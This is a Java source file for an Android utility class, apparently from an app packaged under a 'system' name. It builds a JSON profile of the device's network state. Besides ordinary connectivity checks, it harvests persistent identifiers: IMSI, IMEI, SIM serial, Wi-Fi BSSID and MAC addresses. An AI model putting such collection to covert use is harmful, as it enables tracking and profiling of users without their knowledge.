package com.xrc.system.network;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.xrc.system.core.Constants;

import org.json.JSONException;
import org.json.JSONObject;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.Collections;
import java.util.Enumeration;

public class NetworkUtils {
    private static final String TAG = Constants.TAG + ":Net";

    public static JSONObject getNetworkInfo(Context ctx) {
        JSONObject info = new JSONObject();
        try {
            ConnectivityManager cm = (ConnectivityManager) ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) return info;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Network network = cm.getActiveNetwork();
                if (network != null) {
                    NetworkCapabilities caps = cm.getNetworkCapabilities(network);
                    if (caps != null) {
                        info.put("wifi", caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI));
                        info.put("cellular", caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR));
                        info.put("vpn", caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN));
                        info.put("metered", !caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_NOT_METERED));
                    }
                }
            } else {
                NetworkInfo ni = cm.getActiveNetworkInfo();
                if (ni != null) {
                    info.put("connected", ni.isConnected());
                    info.put("type", ni.getTypeName());
                }
            }

            WifiManager wm = (WifiManager) ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wm != null) {
                WifiInfo wifiInfo = wm.getConnectionInfo();
                if (wifiInfo != null) {
                    info.put("ssid", wifiInfo.getSSID());
                    info.put("bssid", wifiInfo.getBSSID());
                    info.put("rssi", wifiInfo.getRssi());
                    info.put("ip", intToIp(wifiInfo.getIpAddress()));
                    info.put("mac", wifiInfo.getMacAddress());
                }
            }

            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                info.put("carrier", tm.getNetworkOperatorName());
                info.put("mcc_mnc", tm.getNetworkOperator());
                info.put("imsi", tm.getSubscriberId());
                info.put("imei", tm.getDeviceId());
                info.put("sim_serial", tm.getSimSerialNumber());
                info.put("sim_operator", tm.getSimOperatorName());
                info.put("phone_type", tm.getPhoneType());
                info.put("network_type", tm.getNetworkType());
                info.put("roaming", tm.isNetworkRoaming());
            }

            info.put("interfaces", getNetworkInterfaces());

        } catch (JSONException | SecurityException e) {
            Log.e(TAG, "Network info failed", e);
        }
        return info;
    }

    private static String intToIp(int ip) {
        return String.format("%d.%d.%d.%d",
                (ip & 0xff), (ip >> 8 & 0xff),
                (ip >> 16 & 0xff), (ip >> 24 & 0xff));
    }

    private static JSONObject getNetworkInterfaces() {
        JSONObject result = new JSONObject();
        try {
            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
            for (NetworkInterface ni : Collections.list(interfaces)) {
                if (ni.isUp() && !ni.isLoopback()) {
                    JSONObject iface = new JSONObject();
                    iface.put("display", ni.getDisplayName());
                    iface.put("hwaddr", bytesToMac(ni.getHardwareAddress()));
                    Enumeration<InetAddress> addrs = ni.getInetAddresses();
                    StringBuilder ips = new StringBuilder();
                    for (InetAddress addr : Collections.list(addrs)) {
                        if (ips.length() > 0) ips.append(", ");
                        ips.append(addr.getHostAddress());
                    }
                    iface.put("addresses", ips.toString());
                    result.put(ni.getName(), iface);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Interface enumeration failed", e);
        }
        return result;
    }

    private static String bytesToMac(byte[] mac) {
        if (mac == null) return "";
        StringBuilder sb = new StringBuilder();
        for (byte b : mac) {
            if (sb.length() > 0) sb.append(":");
            sb.append(String.format("%02x", b));
        }
        return sb.toString();
    }

    public static boolean isOnline(Context ctx) {
        ConnectivityManager cm = (ConnectivityManager) ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm == null) return false;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Network network = cm.getActiveNetwork();
            if (network == null) return false;
            NetworkCapabilities caps = cm.getNetworkCapabilities(network);
            return caps != null && caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET);
        }
        NetworkInfo ni = cm.getActiveNetworkInfo();
        return ni != null && ni.isConnected();
    }
}
